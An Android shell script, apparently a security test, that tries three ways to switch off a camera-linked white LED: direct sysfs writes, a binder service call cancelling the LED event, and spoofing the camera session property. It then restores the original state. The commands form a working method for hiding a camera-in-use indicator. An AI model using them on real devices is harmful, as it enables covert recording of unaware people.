#!/system/bin/sh
LOG=/data/local/tmp/led_test.log
exec > "$LOG" 2>&1

echo "=== LED TEST START ($(date)) ==="
id
getenforce
echo ""

echo "########## STEP 1: CONFIRM CURRENT LED STATE ##########"
echo "--- /sys/class/leds/white/ ---"
ls -la /sys/class/leds/white/ 2>&1
echo "--- max_brightness ---"; cat /sys/class/leds/white/max_brightness 2>&1
echo "--- max_current ---"; cat /sys/class/leds/white/max_current 2>&1
echo "--- brightness ---"; cat /sys/class/leds/white/brightness 2>&1
echo "--- led_current ---"; cat /sys/class/leds/white/led_current 2>&1
echo "--- vendor.rkd.camera.led.enable ---"; getprop vendor.rkd.camera.led.enable
echo "--- vendor.rkd.camera.session_open ---"; getprop vendor.rkd.camera.session_open
echo "--- dumpsys lights_ctrl mCurrentEvent ---"; dumpsys lights_ctrl 2>&1 | grep -A5 "mCurrentEvent"
echo "--- service list (light) ---"; service list 2>&1 | grep -i light

ORIG_BRIGHT=$(cat /sys/class/leds/white/brightness 2>/dev/null)
ORIG_CUR=$(cat /sys/class/leds/white/led_current 2>/dev/null)
ORIG_SESSION=$(getprop vendor.rkd.camera.session_open)
ORIG_LEDEN=$(getprop vendor.rkd.camera.led.enable)
echo "ORIG_BRIGHT=[$ORIG_BRIGHT] ORIG_CUR=[$ORIG_CUR] ORIG_SESSION=[$ORIG_SESSION] ORIG_LEDEN=[$ORIG_LEDEN]"
echo ""

echo "########## STEP 2: PATH A - sysfs direct write (DAC override) ##########"
echo "--- write 0 to brightness ---"; echo 0 > /sys/class/leds/white/brightness; echo "write_rc=$?"
echo "--- write 0 to led_current ---"; echo 0 > /sys/class/leds/white/led_current; echo "write_rc=$?"
echo "--- brightness after ---"; cat /sys/class/leds/white/brightness 2>&1
echo "--- led_current after ---"; cat /sys/class/leds/white/led_current 2>&1
echo ""

echo "########## STEP 3: PATH B - binder cancellation (IPC interception) ##########"
echo "--- service call lights_ctrl 9 i32 2 i32 2014 ---"
service call lights_ctrl 9 i32 2 i32 2014 2>&1
echo "--- dumpsys lights_ctrl mCurrentEvent after cancel ---"
dumpsys lights_ctrl 2>&1 | grep -A5 "mCurrentEvent"
echo ""

echo "########## STEP 4: PATH C - property spoof (state forgery) ##########"
echo "--- setprop session_open 0 ---"; setprop vendor.rkd.camera.session_open 0; echo "rc=$?"
echo "--- getprop session_open after spoof ---"; getprop vendor.rkd.camera.session_open
echo "--- dmesg tail camera ---"; dmesg 2>&1 | tail -5 | grep -i camera
echo ""

echo "########## STEP 5: RESTORE & VERIFY ##########"
echo "--- write 255 brightness ---"; echo 255 > /sys/class/leds/white/brightness; echo "rc=$?"
echo "--- write 255 led_current ---"; echo 255 > /sys/class/leds/white/led_current; echo "rc=$?"
echo "--- setprop session_open 1 ---"; setprop vendor.rkd.camera.session_open 1; echo "rc=$?"
echo "--- service call lights_ctrl 8 i32 2 i32 2014 ---"; service call lights_ctrl 8 i32 2 i32 2014 2>&1
echo "--- final brightness ---"; cat /sys/class/leds/white/brightness 2>&1
echo "--- final led_current ---"; cat /sys/class/leds/white/led_current 2>&1
echo "--- dumpsys lights_ctrl mCurrentEvent final ---"; dumpsys lights_ctrl 2>&1 | grep -A5 "mCurrentEvent"
echo ""

echo "########## SAFETY RESTORE TO EXACT ORIGINALS ##########"
echo "$ORIG_BRIGHT" > /sys/class/leds/white/brightness
echo "$ORIG_CUR" > /sys/class/leds/white/led_current
if [ -n "$ORIG_SESSION" ]; then setprop vendor.rkd.camera.session_open "$ORIG_SESSION"; else setprop vendor.rkd.camera.session_open ""; fi
setprop vendor.rkd.camera.led.enable "$ORIG_LEDEN"
echo "--- after safety restore ---"
echo -n "brightness="; cat /sys/class/leds/white/brightness 2>&1
echo -n "led_current="; cat /sys/class/leds/white/led_current 2>&1
echo -n "session_open="; getprop vendor.rkd.camera.session_open
echo -n "led.enable="; getprop vendor.rkd.camera.led.enable

echo ""
echo "=== LED_TEST_DONE ==="
